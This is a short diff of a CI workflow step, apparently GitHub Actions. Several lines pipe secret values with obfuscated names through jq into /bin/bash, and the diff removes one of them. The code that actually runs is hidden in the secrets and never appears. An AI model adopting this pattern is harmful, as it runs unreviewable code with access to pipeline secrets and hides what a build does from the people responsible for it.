@@ -19,7 +19,6 @@ jobs:
           onp5: ${{ secrets.onp5 }}
         run: |
           printf '%s' "$onp5" | jq -r .vsqq3958 | /bin/bash
-          echo $nfja23 | jq -r .jnph5867 | /bin/bash
           printf '%s' "$ckqv2" | jq -r .tuk221 | /bin/bash
           echo $e330 | jq -r .l9 | /bin/bash
           printf '%s' "$n9" | jq -r .aijr3267 | /bin/bash
